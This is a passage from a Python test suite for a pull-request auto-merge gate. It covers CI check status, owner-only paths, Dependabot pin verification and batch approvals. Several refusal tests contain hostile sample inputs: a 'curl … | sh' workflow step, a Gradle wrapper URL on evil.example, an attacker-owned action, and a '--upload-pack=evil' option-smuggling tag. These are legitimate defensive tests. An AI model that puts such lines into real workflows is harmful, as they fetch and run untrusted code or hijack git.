"""Tests for scripts/merge_ready.py (issue 136). Run: python3 -I scripts/test_merge_ready.py

The GitHub REST API is replaced by a fake; no test touches the network. Every negative case must leave the merge call
unmade (`FakeApi.merged` stays empty)."""

import copy
import io
import os
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parent / "hooks"))
import merge_ready  # noqa: E402  # justified: must follow the sys.path insert above
import pretooluse_guard  # noqa: E402  # justified: its PROTECTED list is the source of the process files (R1-03)

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "scripts" / "merge_ready.py"
REPO = "bondo/listicles2"
SHA = "a" * 40
OTHER_SHA = "b" * 40
N = 77
REQUIRED = ["guards", "tasks", "static"]
PIN_OLD = "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
PIN_NEW = "      - uses: actions/checkout@" + "c" * 40 + " # v7.1.0"
SUB_OLD = "        uses: github/codeql-action/init@" + "d" * 40 + " # v4.1.0"
SUB_NEW = "        uses: github/codeql-action/init@" + "e" * 40 + " # v4.2.0"
WRAP_OLD = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.1-bin.zip"
WRAP_NEW = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.2-all.zip"
WRAP_PATCH = f"@@ -1,2 +1,2 @@\n-{WRAP_OLD}\n+{WRAP_NEW}\n-distributionSha256Sum={'1' * 64}\n+distributionSha256Sum={'2' * 64}"


PIN_TAGS = {("actions/checkout", "v7.1.0"): "c" * 40, ("github/codeql-action", "v4.2.0"): "e" * 40}


def fake_resolver(table=None, calls=None):
    """A stand-in for the tag lookup: (owner/repo, tag) -> the commit sha the tag points to; no network."""
    table = PIN_TAGS if table is None else table

    def resolve(repo, tag):
        if calls is not None:
            calls.append((repo, tag))
        if (repo, tag) not in table:
            raise merge_ready.PinError(f"tag {tag} not found in {repo}")
        return table[(repo, tag)]

    return resolve


def file_entry(name, status="modified", patch="@@ -1 +1 @@\n-old\n+new", previous=None):
    entry = {"filename": name, "status": status, "patch": patch}
    if previous:
        entry["previous_filename"] = previous
    return entry


def run(name, status="completed", conclusion="success", rid=1, app=15368):
    return {"id": rid, "name": name, "status": status, "conclusion": conclusion, "app": {"id": app}}


class FakeApi:
    """Answers the few REST routes merge_ready uses, from a dict keyed by path (no query string)."""

    def __init__(self, data):
        self.data = data
        self.merged = []
        self.requested = []

    def get(self, path):
        self.requested.append(path)
        return copy.deepcopy(self.data[path])

    def pages(self, path, key=None):
        self.requested.append(path)
        return copy.deepcopy(self.data[path])

    def put(self, path, fields):
        self.merged.append((path, dict(fields)))
        return {"merged": True, "sha": "d" * 40}


def make_api(files=None, title="Update the plan", body="Refreshes section 4. See issue 15.", sha=SHA, state="clean", checks=None,
             required=None, commits=None, base="main", counts=None):
    files = files if files is not None else [file_entry("docs/product/flow.md")]
    commits = commits if commits is not None else [{"commit": {"message": "Edit flow doc"}}]
    counts = counts or {}
    pulls = f"repos/{REPO}/pulls/{N}"
    contexts = REQUIRED if required is None else required
    rules = [{"type": "required_status_checks", "parameters": {"required_status_checks": [{"context": c, "integration_id": 15368} for c in contexts]}}]
    return FakeApi(
        {
            pulls: {"head": {"sha": sha}, "base": {"ref": base}, "title": title, "body": body, "mergeable_state": state, "draft": False,
                     "changed_files": counts.get("files", len(files)), "commits": counts.get("commits", len(commits))},
            pulls + "/files": files,
            pulls + "/commits": commits,
            f"repos/{REPO}/rules/branches/{base}": rules,
            f"repos/{REPO}/commits/{SHA}/check-runs": checks if checks is not None else [run(c) for c in REQUIRED],
        }
    )


def go(api, sha=SHA, kind="working-draft-docs", resolver=None, flags=(), **kwargs):
    out, err = io.StringIO(), io.StringIO()
    code = merge_ready.main([*flags, str(N), sha, kind], api=api, out=out, err=err, resolver=resolver or fake_resolver(), **kwargs)
    return code, out.getvalue() + err.getvalue()


class HappyPathTests(unittest.TestCase):
    def test_docs_squash_merge_is_sha_pinned(self):
        api = make_api()
        code, text = go(api)
        self.assertEqual(code, 0, text)
        want = {"merge_method": "squash", "sha": SHA, "commit_title": "Update the plan (#77)", "commit_message": "Refreshes section 4. See issue 15."}
        self.assertEqual(api.merged, [(f"repos/{REPO}/pulls/{N}/merge", want)])

    def test_tasks_sync_with_only_tasks_toml(self):
        api = make_api(files=[file_entry("docs/tasks.toml")])
        self.assertEqual(go(api, kind="tasks-sync")[0], 0)
        self.assertEqual(len(api.merged), 1)

    def test_dependabot_manifests_and_workflow_pin(self):
        patch = f"@@ -3 +3 @@\n-{PIN_OLD}\n+{PIN_NEW}"
        files = [
            file_entry("gradle/wrapper/gradle-wrapper.properties", patch=WRAP_PATCH),
            file_entry(".github/workflows/status.yml", patch=f"@@ -3 +3 @@\n-{SUB_OLD}\n+{SUB_NEW}"),
            file_entry(".github/workflows/ci.yml", patch=patch),
        ]
        api = make_api(files=files)
        self.assertEqual(go(api, kind="dependabot")[0], 0)
        self.assertEqual(len(api.merged), 1)

    def test_every_listed_working_draft_is_accepted(self):
        names = ("docs/PLAN.md", "docs/product/stories.md", "docs/product/flow.md", "docs/product/rubric.md", "design/tokens.json",
                 "docs/milestones/M1.md", "docs/product/wireframes/wireframes.html", "docs/product/wireframes/01-sign-in-dark.png")
        files = [file_entry(n) for n in names[:-1]] + [{"filename": names[-1], "status": "added"}]  # a png has no patch
        self.assertEqual(go(make_api(files=files))[0], 0)

    def test_extra_runs_do_not_matter_and_the_latest_run_of_a_check_counts(self):
        old_red = run("guards", conclusion="failure", rid=1)
        for extra in ([run("optional", conclusion="failure")], [old_red]):  # not required; and older than the green run below
            self.assertEqual(go(make_api(checks=[run("guards", rid=2), run("tasks"), run("static"), *extra]))[0], 0)


class RefusalTests(unittest.TestCase):
    def refused(self, api, reason, sha=SHA, kind="working-draft-docs", resolver=None):
        code, text = go(api, sha=sha, kind=kind, resolver=resolver)
        self.assertNotEqual(code, 0, text)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")
        self.assertRegex(text, reason)

    def test_head_moved_from_the_given_sha(self):
        self.refused(make_api(sha=OTHER_SHA), r"head .*" + OTHER_SHA[:7] + r".*not .*" + SHA[:7])

    def test_behind_blocked_dirty_and_unknown_are_not_clean(self):
        for state in ("behind", "blocked", "dirty", "unknown", "unstable", "draft", "has_hooks"):
            with self.subTest(state=state):
                self.refused(make_api(state=state), rf"mergeable_state.*{state}")

    def test_required_check_red_pending_or_missing(self):
        pending = run("static", status="in_progress", conclusion=None)
        cases = [([run("guards"), run("tasks", conclusion="failure"), run("static")], r"tasks.*failure"),
                 ([run("guards"), run("tasks"), pending], r"static.*(pending|in_progress)"),
                 ([run("guards"), run("tasks")], r"static.*(missing|no check run)")]
        for conclusion in ("skipped", "neutral", "cancelled", "timed_out", "action_required"):  # none of these is success
            cases.append(([run("guards"), run("tasks", conclusion=conclusion), run("static")], rf"tasks.*{conclusion}"))
        for checks, reason in cases:
            with self.subTest(reason=reason):
                self.refused(make_api(checks=checks), reason)

    def test_no_required_checks_configured_fails_closed(self):
        self.refused(make_api(required=[]), r"required (status )?checks")

    def test_closing_keyword_in_body_title_or_commit(self):
        cases = [{"body": t} for t in ("Fixes #12", "closes #12", "This will resolve #12.", "Closed: #12", "fix owner/repo#12", "RESOLVED #12")]
        cases += [{"body": f"fixes {host}/bondo/listicles2/issues/12"} for host in ("https://github.com", "http://github.com", "https://www.github.com")]
        cases += [{"title": "Fix #12 in the plan"}, {"commits": [{"commit": {"message": "Edit flow doc\n\nCloses #12"}}]}]
        for kwargs in cases:
            with self.subTest(**kwargs):
                self.refused(make_api(**kwargs), r"closing keyword")

    def test_prose_without_issue_number_is_fine(self):
        api = make_api(body="Fixes the typo in the prefix. Closed beta, see #12. Issue 136. Fix 12 items.")
        self.assertEqual(go(api)[0], 0)

    def test_path_outside_docs_kind(self):
        owner_only = ("docs/product/naming.md", "docs/reviews/README.md", "docs/reviews/collaborator-workflow.md", "docs/reviews/new.md")  # R3-01
        for name in ("scripts/merge_ready.py", "docs/tasks.toml", "docs/ORCHESTRATION.md", "CLAUDE.md", ".github/workflows/ci.yml", *owner_only):
            with self.subTest(name=name):
                files = [file_entry("docs/product/flow.md"), file_entry(name)]
                self.refused(make_api(files=files), re.escape(name))

    def test_tasks_sync_refuses_any_other_file(self):
        files = [file_entry("docs/tasks.toml"), file_entry("docs/product/flow.md")]
        self.refused(make_api(files=files), r"docs/product/flow\.md", kind="tasks-sync")

    def test_dotdot_path_and_rename_out_of_the_allowed_paths_are_refused(self):
        for entry, reason in ((file_entry("docs/product/../../scripts/x.py"), r"\.\."),
                              (file_entry("docs/product/new.md", status="renamed", previous="scripts/guards.sh"), r"scripts/guards\.sh")):
            with self.subTest(reason=reason):
                self.refused(make_api(files=[entry]), reason)

    def test_dependabot_workflow_without_a_patch_is_refused(self):
        files = [file_entry(".github/workflows/ci.yml")]
        del files[0]["patch"]
        self.refused(make_api(files=files), r"ci\.yml.*patch", kind="dependabot")

    def test_docs_kind_refuses_workflow_pin_changes(self):
        patch = f"@@ -3 +3 @@\n-{PIN_OLD}\n+{PIN_NEW}"
        self.refused(make_api(files=[file_entry(".github/workflows/ci.yml", patch=patch)]), r"ci\.yml")

    def test_queued_rerun_beats_an_older_green_run(self):
        queued = run("guards", status="queued", conclusion=None, rid=9)
        self.refused(make_api(checks=[queued, run("guards", rid=2), run("tasks"), run("static")]), r"guards.*pending")

    def test_success_from_another_app_does_not_count(self):
        self.refused(make_api(checks=[run("guards", app=999), run("tasks"), run("static")]), r"guards.*missing")

    def test_base_other_than_main_is_refused(self):
        self.refused(make_api(base="release"), r"base .*release.*main")

    def test_truncated_file_or_commit_list_is_refused(self):
        for counts, reason in (({"files": 3001}, r"files.*3001"), ({"commits": 251}, r"commits.*251")):
            with self.subTest(counts=counts):
                self.refused(make_api(counts=counts), reason)

    def test_dependabot_workflow_changes_beyond_a_repin_are_refused(self):
        evil, other = PIN_NEW.replace("actions/checkout", "attacker/checkout"), SUB_NEW.replace("/init@", "/analyze@")
        patches = [f"@@ -3 +3 @@\n-{PIN_OLD}\n+{evil}", f"@@ -3 +3 @@\n-{SUB_OLD}\n+{other}",  # another action or sub-path
                   f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh",  # an extra line
                   f"@@ -3 +3 @@\n-{PIN_OLD}\n+      - uses: actions/checkout@v7",  # a tag, not a sha
                   f"@@ -3 +3,2 @@\n {PIN_OLD}\n+{PIN_NEW}", f"@@ -3,2 +3 @@\n {PIN_NEW}\n-{PIN_OLD}",  # an added or a removed step
                   f"@@ -3,3 +3,3 @@\n-{PIN_OLD}\n     with: {{}}\n+{PIN_NEW}"]  # R2-02: a pin moved across context lines
        for patch in patches:
            with self.subTest(patch=patch):
                files = [file_entry(".github/workflows/ci.yml", patch=patch)]
                self.refused(make_api(files=files), r"ci\.yml.*(pin|uses)", kind="dependabot")

    def test_status_line_edit_that_keeps_not_owner_approved_is_fine(self):
        tail = "; not owner-approved (see issue #15)."
        keep = f"@@ -3 +3 @@\n-Status: working draft, 2026-11-15{tail}\n+Status: working draft, 2026-11-18{tail}"
        self.assertEqual(go(make_api(files=[file_entry("docs/product/stories.md", patch=keep)]))[0], 0)

    def test_sign_off_that_removes_not_owner_approved_is_refused(self):
        """R3-01: turning a working draft into an approved doc is the owner's call, whatever the file."""
        flip = "@@ -3 +3 @@\n-Status: working draft, merged as the baseline; not owner-approved (see issue #15).\n+Status: approved by the owner, 2026-11-18."
        no_patch = [{"filename": "docs/product/stories.md", "status": "modified"}, {"filename": "docs/PLAN.md", "status": "removed"},
                    {"filename": "docs/product/wireframes/p.png", "status": "renamed", "previous_filename": "docs/PLAN.md"}]  # R4-01
        for f in [file_entry(n, patch=flip) for n in ("docs/product/stories.md", "docs/PLAN.md", "design/tokens.json")] + no_patch:
            with self.subTest(f=f):
                self.refused(make_api(files=[f]), re.escape(f["filename"]) + r".*not owner-approved")

    def test_dependabot_renamed_or_deleted_file_is_refused(self):
        """R3-02: a dependency bump only modifies files."""
        for status in ("renamed", "removed", "added"):
            with self.subTest(status=status):
                files = [file_entry("gradle/wrapper/gradle-wrapper.jar", status=status)]
                self.refused(make_api(files=files), rf"gradle-wrapper\.jar.*{status}", kind="dependabot")

    def test_dependabot_manifests_go_to_the_owner(self):
        """R2-01: manifests whose content is not checked (a `test` script, postinstall, a requirement URL) are outside the kind."""
        for name in ("firebase/package.json", "firebase/package-lock.json", "gradle/libs.versions.toml", "scripts/requirements-lint.txt",
                     "app/build.gradle.kts"):
            with self.subTest(name=name):
                self.refused(make_api(files=[file_entry(name)]), rf"outside kind dependabot: {re.escape(name)}", kind="dependabot")

    def test_dependabot_wrapper_other_host_or_property_is_refused(self):
        evil = "distributionUrl=https\\://evil.example/gradle-9.2-bin.zip"
        for patch in (f"@@ -1 +1 @@\n-{WRAP_OLD}\n+{evil}", "@@ -1 +1 @@\n-networkTimeout=10000\n+networkTimeout=1"):
            with self.subTest(patch=patch):
                files = [file_entry("gradle/wrapper/gradle-wrapper.properties", patch=patch)]
                self.refused(make_api(files=files), r"gradle-wrapper\.properties", kind="dependabot")

    def test_no_changed_files_is_refused(self):
        self.refused(make_api(files=[]), r"no changed files")

    def test_all_failures_are_listed(self):
        api = make_api(state="behind", body="fixes #1", files=[file_entry("CLAUDE.md")])
        code, text = go(api)
        self.assertNotEqual(code, 0)
        for reason in ("behind", "closing keyword", "CLAUDE.md"):
            self.assertIn(reason, text)
        self.assertEqual(api.merged, [])


def pin_files(old=PIN_OLD, new=PIN_NEW, name=".github/workflows/ci.yml"):
    return [file_entry(name, patch=f"@@ -3 +3 @@\n-{old}\n+{new}")]


class PinTagTests(unittest.TestCase):
    """R2-06: a re-pinned action must point at the commit its `# <tag>` comment names (an imposter commit is refused)."""

    def refused(self, files, reason, resolver=None):
        api = make_api(files=files)
        code, text = go(api, kind="dependabot", resolver=resolver)
        self.assertEqual(code, 1, text)
        self.assertRegex(text, reason)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")

    def test_sha_equal_to_the_tag_commit_is_merged(self):
        calls = []
        api = make_api(files=pin_files())
        self.assertEqual(go(api, kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(calls, [("actions/checkout", "v7.1.0")])
        self.assertEqual(len(api.merged), 1)

    def test_every_new_pin_is_checked_including_sub_path_actions(self):
        calls = []
        files = pin_files() + pin_files(SUB_OLD, SUB_NEW, ".github/workflows/status.yml")
        self.assertEqual(go(make_api(files=files), kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(sorted(calls), [("actions/checkout", "v7.1.0"), ("github/codeql-action", "v4.2.0")])  # owner/repo, not owner/repo/init

    def test_one_bad_pin_among_good_ones_refuses_the_pr(self):
        files = pin_files() + pin_files(SUB_OLD, SUB_NEW, ".github/workflows/status.yml")
        table = {**PIN_TAGS, ("github/codeql-action", "v4.2.0"): "f" * 40}
        self.refused(files, r"status\.yml.*codeql-action.*v4\.2\.0", fake_resolver(table))

    def test_sha_of_a_different_commit_is_refused(self):
        table = {("actions/checkout", "v7.1.0"): "9" * 40}
        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*v7\.1\.0.*" + "9" * 7 + ".*" + "c" * 7, fake_resolver(table))

    def test_missing_or_empty_tag_comment_is_refused(self):
        for new in ("      - uses: actions/checkout@" + "c" * 40, "      - uses: actions/checkout@" + "c" * 40 + " #",
                    "      - uses: actions/checkout@" + "c" * 40 + "   # "):
            with self.subTest(new=new):
                calls = []
                self.refused(pin_files(new=new), r"ci\.yml.*actions/checkout.*tag comment", fake_resolver(calls=calls))
                self.assertEqual(calls, [], "nothing to look up without a tag")

    def test_unknown_tag_is_refused(self):
        self.refused(pin_files(new=PIN_NEW.replace("v7.1.0", "v9.9.9")), r"v9\.9\.9.*not found", fake_resolver())

    def test_lookup_failure_fails_closed(self):
        def broken(repo, tag):
            raise merge_ready.PinError(f"git ls-remote {repo} failed: network unreachable")

        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*network unreachable", broken)

    def test_unexpected_resolver_crash_is_refused_with_a_reason(self):
        """R1-01: a crash in the lookup gives a clean exit 1 and a reason, not a traceback (and never a merge)."""

        def crash(repo, tag):
            raise OSError("boom")

        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*v7\.1\.0.*lookup crashed \(OSError\)", crash)

    def test_a_pin_that_pin_only_accepts_but_cannot_be_parsed_is_refused(self):
        """R1-02: every line pin_only accepts must get the tag check; a line the tag check cannot read fails closed."""
        old, new = "      - uses: actions/checkout/@" + "a" * 40 + " # v1.0.0", "      - uses: actions/checkout/@" + "b" * 40 + " # v9.9.9"
        self.assertTrue(merge_ready.pin_only(f"@@ -3 +3 @@\n-{old}\n+{new}"), "precondition: pin_only accepts this diff")
        calls = []
        self.refused(pin_files(old, new), r"ci\.yml.*unparsed pin", fake_resolver(calls=calls))
        self.assertEqual(calls, [])

    def test_a_pin_change_with_extra_edits_is_still_refused_even_when_the_sha_is_right(self):
        patch = f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh"
        self.refused([file_entry(".github/workflows/ci.yml", patch=patch)], r"ci\.yml.*(pin|uses)", fake_resolver())

    def test_wrapper_bump_makes_no_lookup(self):
        calls = []
        files = [file_entry("gradle/wrapper/gradle-wrapper.properties", patch=WRAP_PATCH)]
        self.assertEqual(go(make_api(files=files), kind="dependabot", resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(calls, [])

    def test_docs_kind_makes_no_lookup(self):
        calls = []
        self.assertEqual(go(make_api(), resolver=fake_resolver(calls=calls))[0], 0)
        self.assertEqual(calls, [])


class FakeRun:
    """Replaces subprocess.run for ls_remote_resolver: records the command, answers with a canned result."""

    def __init__(self, stdout="", returncode=0, stderr="", exc=None):
        self.result = subprocess.CompletedProcess([], returncode, stdout, stderr)
        self.exc = exc
        self.cmds = []

    def __call__(self, cmd, **kwargs):
        self.cmds.append((cmd, kwargs))
        if self.exc:
            raise self.exc
        return self.result


class LsRemoteResolverTests(unittest.TestCase):
    TAG_OBJ, COMMIT = "1" * 40, "2" * 40

    def resolve(self, runner, repo="actions/checkout", tag="v7.1.0"):
        return merge_ready.ls_remote_resolver(runner)(repo, tag)

    def test_asks_git_ls_remote_for_the_tag_and_its_peeled_commit(self):
        runner = FakeRun(f"{self.COMMIT}\trefs/tags/v7.1.0\n")
        self.assertEqual(self.resolve(runner), self.COMMIT)
        cmd, kwargs = runner.cmds[0]
        self.assertEqual(cmd, ["git", "ls-remote", "https://github.com/actions/checkout", "refs/tags/v7.1.0", "refs/tags/v7.1.0^{}"])
        self.assertTrue(kwargs.get("timeout"), "a hung network must not hang the merge agent")

    def test_annotated_tag_is_dereferenced_to_its_commit(self):
        for lines in ((f"{self.TAG_OBJ}\trefs/tags/v7.1.0", f"{self.COMMIT}\trefs/tags/v7.1.0^{{}}"),  # either output order
                      (f"{self.COMMIT}\trefs/tags/v7.1.0^{{}}", f"{self.TAG_OBJ}\trefs/tags/v7.1.0")):
            with self.subTest(lines=lines):
                self.assertEqual(self.resolve(FakeRun("\n".join(lines) + "\n")), self.COMMIT)

    def test_other_refs_in_the_output_are_ignored(self):
        out = f"{'3' * 40}\trefs/tags/v7.1.0-rc1\n{self.COMMIT}\trefs/tags/v7.1.0\n"
        self.assertEqual(self.resolve(FakeRun(out)), self.COMMIT)

    def test_failures_all_raise_pin_error(self):
        cases = {
            "ls-remote error": FakeRun(returncode=128, stderr="fatal: unable to access"),
            "no such tag": FakeRun(""),
            "no matching ref": FakeRun(f"{'3' * 40}\trefs/tags/other\n"),
            "garbled sha": FakeRun("zzzz\trefs/tags/v7.1.0\n"),
            "timeout": FakeRun(exc=subprocess.TimeoutExpired("git", 30)),
            "no git": FakeRun(exc=FileNotFoundError("git")),
        }
        for name, runner in cases.items():
            with self.subTest(name), self.assertRaises(merge_ready.PinError):
                self.resolve(runner)

    def test_a_repo_or_tag_that_could_smuggle_an_option_or_a_url_is_refused_before_git_runs(self):
        for repo, tag in (("actions/checkout", "--upload-pack=evil"), ("actions/checkout", "v1 refs/heads/main"), ("-o/evil", "v1"),
                          ("actions/checkout/../x", "v1"), ("evil.example/x@y", "v1"), ("actions", "v1")):
            with self.subTest(repo=repo, tag=tag):
                runner = FakeRun(f"{self.COMMIT}\trefs/tags/v1\n")
                with self.assertRaises(merge_ready.PinError):
                    self.resolve(runner, repo, tag)
                self.assertEqual(runner.cmds, [])


class UsageTests(unittest.TestCase):
    def cli(self, *args):
        return subprocess.run([sys.executable, "-I", str(SCRIPT), *args], capture_output=True, text=True, timeout=30)

    def test_unknown_kind_exits_nonzero_before_any_api_call(self):
        api = make_api()
        code, text = go(api, kind="feature-code")
        self.assertNotEqual(code, 0)
        self.assertIn("unknown kind", text)
        self.assertEqual(api.requested, [])
        self.assertEqual(api.merged, [])

    def test_kinds_are_exactly_the_authorized_ones(self):
        self.assertEqual(sorted(merge_ready.KINDS), ["dependabot", "general", "owner-batch", "tasks-sync", "working-draft-docs"])

    def test_cli_unknown_kind(self):
        res = self.cli("12", SHA, "everything")
        self.assertNotEqual(res.returncode, 0)
        self.assertIn("unknown kind", res.stderr + res.stdout)

    def test_cli_bad_arguments(self):
        for args in (("x", SHA, "dependabot"), ("12", "abc", "dependabot"), ("12", SHA), ("12", SHA, "dependabot", "extra"), (),
                     ("--approval", "12", SHA, "owner-batch"), ("--approval", "x", "12", SHA, "owner-batch"),  # no value, or not a comment id
                     ("--approval", "5", "12", SHA, "general"),  # an approval belongs to owner-batch only
                     ("--wait", "--wait", "12", SHA, "general", "extra"), ("--bogus", "12", SHA, "general")):
            with self.subTest(args=args):
                res = self.cli(*args)
                self.assertNotEqual(res.returncode, 0)

    def test_api_error_refuses(self):
        class Broken(FakeApi):
            def get(self, path):
                raise merge_ready.ApiError("boom")

        api = Broken({})
        code, text = go(api)
        self.assertNotEqual(code, 0)
        self.assertIn("boom", text)
        self.assertEqual(api.merged, [])

    def test_merge_api_error_is_a_failure(self):
        class NoMerge(FakeApi):
            def put(self, path, fields):
                raise merge_ready.ApiError("405 not mergeable")

        api = NoMerge(make_api().data)
        code, text = go(api)
        self.assertNotEqual(code, 0)
        self.assertIn("405", text)


class GeneralKindTests(unittest.TestCase):
    """Kind `general`: a PR that is not owner-only, merged under the owner's standing authorization (#15 comment 7005366747)."""

    def refused(self, api, reason, **kwargs):
        code, text = go(api, kind="general", **kwargs)
        self.assertNotEqual(code, 0, text)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")
        self.assertRegex(text, reason)

    def test_non_gate_scripts_docs_and_build_files_are_merged(self):
        names = ("scripts/verify.sh", "scripts/new_tool.py", "scripts/test_new_tool.py", "app/build.gradle.kts", "README.md", "docs/FOLLOW-UPS.md",
                 "core/domain/src/Lists.kt", "docs/PLAN.md", "design/tokens.json", "docs/milestones/M1.md", "firebase/test/rules.test.ts")
        api = make_api(files=[file_entry(n) for n in names])
        self.assertEqual(go(api, kind="general")[0], 0)
        self.assertEqual([m[1]["sha"] for m in api.merged], [SHA])

    def test_every_owner_only_path_is_refused(self):
        names = ("docs/ORCHESTRATION.md", "docs/BRANCH-PROTECTION.md", "docs/product/naming.md", "docs/reviews/README.md", "design/new-sign-off.md",
                 "firebase/package.json", "firebase/package-lock.json", "gradle/libs.versions.toml", "scripts/requirements-lint.txt",
                 "gradle/wrapper/gradle-wrapper.properties", "gradle/verification-metadata.xml", ".github/CODEOWNERS")  # the PROTECTED ones: see below
        for name in names:
            with self.subTest(name=name):
                self.refused(make_api(files=[file_entry("scripts/new_tool.py"), file_entry(name)]), r"outside kind general.*" + re.escape(name))

    def test_dotdot_and_a_rename_from_an_owner_only_path_are_refused(self):
        for entry, reason in ((file_entry("scripts/../CLAUDE.md"), r"\.\."),
                              (file_entry("scripts/x.py", status="renamed", previous="scripts/guards.sh"), r"scripts/guards\.sh")):
            with self.subTest(reason=reason):
                self.refused(make_api(files=[entry]), reason)

    def test_a_working_draft_sign_off_or_removal_is_still_the_owners(self):
        flip = "@@ -3 +3 @@\n-Status: working draft; not owner-approved (see issue #15).\n+Status: approved by the owner."
        for f in (file_entry("docs/PLAN.md", patch=flip), {"filename": "docs/PLAN.md", "status": "removed"},
                  {"filename": "docs/milestones/M1.md", "status": "renamed", "previous_filename": "docs/milestones/old.md"}):
            with self.subTest(f=f):
                self.refused(make_api(files=[f]), r"(not owner-approved|sign-off|removal)")

    def test_process_files_from_the_guard_list_are_owner_only(self):  # R1-03: the set comes from pretooluse_guard.PROTECTED, not a second list
        for entry in pretooluse_guard.PROTECTED:
            with self.subTest(entry=entry):
                self.assertTrue(merge_ready.owner_only(entry + ("x" if entry.endswith("/") else "")))
        for name in ("scripts/install-hooks.sh", "scripts/install_linters.sh", "scripts/linters.pins", ".tools/bin/shellcheck", "app/mark-ready.sh",
                     "x/update-branch.sh", "scripts/update-branch.sh"):
            self.refused(make_api(files=[file_entry(name)]), r"outside kind general.*" + re.escape(name))

    def test_approved_product_docs_and_gate_docs_are_owner_only(self):  # R1-04: only the real drafts are not
        for name in ("docs/product/flow.md", "docs/product/stories.md", "docs/product/rubric.md", "docs/product/wireframes/01-sign-in-dark.png",
                     "docs/ANDROID-BEST-PRACTICES.md"):
            self.refused(make_api(files=[file_entry(name)]), r"outside kind general.*" + re.escape(name))

    def test_every_script_a_required_ci_job_runs_is_owner_only(self):  # R1-05: read from ci.yml, so a new CI script needs no list edit
        ci = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
        found = set(re.findall(r"scripts/[\w./-]+\.(?:py|sh)", ci))
        self.assertIn("scripts/check_gradle_repos.py", found)
        for name in sorted(found):
            with self.subTest(name=name):
                self.assertTrue(merge_ready.owner_only(name))
        self.assertFalse(merge_ready.owner_only("scripts/verify.sh"), "not run by a CI job, so a non-gate script")

    def test_without_a_readable_ci_yml_every_scripts_path_is_owner_only(self):  # fails closed
        merge_ready.ci_scripts.cache_clear()
        try:
            orig, merge_ready.CI_YML = merge_ready.CI_YML, ROOT / "no" / "such.yml"
            self.assertTrue(merge_ready.owner_only("scripts/verify.sh"))
        finally:
            merge_ready.CI_YML = orig
            merge_ready.ci_scripts.cache_clear()

    def test_case_variants_of_owner_only_paths_are_refused(self):  # R1-06
        for name in ("claude.md", ".Claude/settings.local.json", ".Githooks/post-checkout", "Scripts/Hooks/x.py", "DOCS/orchestration.md", "Agents/x.md"):
            self.refused(make_api(files=[file_entry(name)]), r"outside kind general")

    def test_the_common_checks_still_apply(self):
        self.refused(make_api(files=[file_entry("scripts/x.py")], state="behind"), r"mergeable_state.*behind")
        self.refused(make_api(files=[file_entry("scripts/x.py")], body="Fixes #1"), r"closing keyword")
        self.refused(make_api(files=[file_entry("scripts/x.py")], checks=[run("guards"), run("tasks")]), r"static.*missing")


C1, M1, M2 = "1" * 40, "2" * 40, SHA  # the approved commit, a first update-branch merge, and the head (a second one)
BASE0, MAIN1, MAIN2 = "4" * 40, "5" * 40, "6" * 40
TREE = "9" * 40  # the tree of every fake update-branch merge, and what the fake `git merge-tree` returns
CID = 7007999999


def commit(sha, parents, message="Edit", tree=TREE):
    return {"sha": sha, "parents": [{"sha": p} for p in parents], "commit": {"message": message, "tree": {"sha": tree}}}


def fake_merge_tree(result=TREE, calls=None, fail=None):
    """Stands in for `git merge-tree --write-tree p1 p2`: the automatic merge's tree, None when it has conflicts, or an error."""
    def merge_tree(p1, p2):
        if calls is not None:
            calls.append((p1, p2))
        if fail:
            raise merge_ready.MergeCheckError(fail)
        return result(p1, p2) if callable(result) else result
    return merge_tree


def approval_comment(listed, login="bondo", assoc="OWNER", issue=15, edited=False, line="batch approval: "):
    return {"user": {"login": login}, "author_association": assoc, "issue_url": f"https://api.github.com/repos/{REPO}/issues/{issue}",
            "body": f"{line}{listed}\nThanks.", "created_at": "2026-11-19T12:00:00Z",
            "updated_at": "2026-11-19T12:05:00Z" if edited else "2026-11-19T12:00:00Z"}


def batch_api(listed=None, commits=None, parent_status="behind", comment=None, earlier=None):
    """A PR whose head is M2 (two update-branch merges after the approved commit C1) and a batch approval comment for it."""
    commits = commits if commits is not None else [commit(C1, [BASE0]), commit(M1, [C1, MAIN1], "Merge branch 'main' into x"),
                                                    commit(M2, [M1, MAIN2], "Merge branch 'main' into x")]
    api = make_api(files=[file_entry("CLAUDE.md")], commits=commits)
    for main_sha in (MAIN1, MAIN2):
        api.data[f"repos/{REPO}/compare/main...{main_sha}"] = {"status": parent_status, "files": []}
    api.data[f"repos/{REPO}/issues/comments/{CID}"] = comment or approval_comment(listed if listed is not None else f"#{N}@{C1[:7]}")
    for num, merged in (earlier or {}).items():
        api.data[f"repos/{REPO}/pulls/{num}"] = {"merged": merged, "state": "closed" if merged else "open"}
    return api


def go_batch(api, sha=M2, flags=("--approval", str(CID)), merge_tree=None, **kwargs):
    return go(api, sha=sha, kind="owner-batch", flags=flags, merge_tree=merge_tree or fake_merge_tree(), **kwargs)


class OwnerBatchTests(unittest.TestCase):
    """Kind `owner-batch` (owner decision D1/D2, #15 comment 7007421567): any paths, but only a PR the owner's batch approval lists with a
    head SHA, and only at that head or at a head that adds update-branch merges of main whose tree is git's automatic merge (R1-02 of #245)."""

    def refused(self, api, reason, sha=M2, flags=("--approval", str(CID)), merge_tree=None):
        code, text = go_batch(api, sha=sha, flags=flags, merge_tree=merge_tree)
        self.assertNotEqual(code, 0, text)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")
        self.assertRegex(text, reason)

    def merged(self, api, sha=M2, **kwargs):
        code, text = go_batch(api, sha=sha, **kwargs)
